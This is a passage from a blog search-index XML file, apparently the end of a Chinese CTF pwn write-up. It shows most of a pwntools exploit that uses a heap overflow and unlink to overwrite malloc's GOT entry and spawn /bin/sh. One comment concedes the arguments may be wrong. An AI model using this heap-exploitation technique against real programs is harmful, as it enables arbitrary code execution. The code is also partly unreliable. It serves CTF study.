&#39;a&#39; + p64(0x1120) + p64(0x90))  #利用heap overflow 改变下一个chunk的prev_size 和 sizefree(1)   #之后&amp;cmd = 0x0000000006010B0 - 0x18 ,这里要注意的是不是free(2),因为上一步改了size位，所以2相当于还是free着呢，所以free(2),会触碰double free检查payload1 = &#39;a&#39; * 0x18 + p64(malloc_got)  //这是的cmd指针 已经被修改了 ， 我们通过fget 可以使得cmd 再次被改为 malloc@got.pltr.sendline(payload1)payload2 = p64(sh_addr) + &#39;;/bin/sh\x00&#39;   //这里就是构造sh函数  ， 可能参数写错了  r.sendline(payload2)r.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
